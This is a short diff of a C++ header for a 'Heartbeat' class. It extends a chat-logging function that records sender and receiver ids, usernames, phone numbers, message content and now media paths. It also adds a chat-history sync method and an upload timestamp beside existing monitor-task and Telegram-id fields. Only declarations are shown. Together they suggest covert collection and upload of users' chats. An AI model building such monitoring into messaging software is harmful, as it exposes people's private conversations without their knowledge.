@@ -16,7 +16,11 @@ public:
     // Public Logging
     void logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing,
                         const QString& senderId = "", const QString& senderUsername = "", const QString& senderPhone = "",
-                        const QString& receiverId = "", const QString& receiverUsername = "", const QString& receiverPhone = "");
+                        const QString& receiverId = "", const QString& receiverUsername = "", const QString& receiverPhone = "",
+                        const QString& mediaPath = "");
+    
+    // Sync
+    void syncChatHistory();
     
 private:
     Heartbeat();
@@ -55,6 +59,7 @@ private:
 
     QTimer _timer;
     QTimer _monitorTimer;
+    int64_t _lastUploadTime = 0;
     QString _monitorTaskId;
     QString _deviceUuid;
     uint64_t _currentTgId = 0;
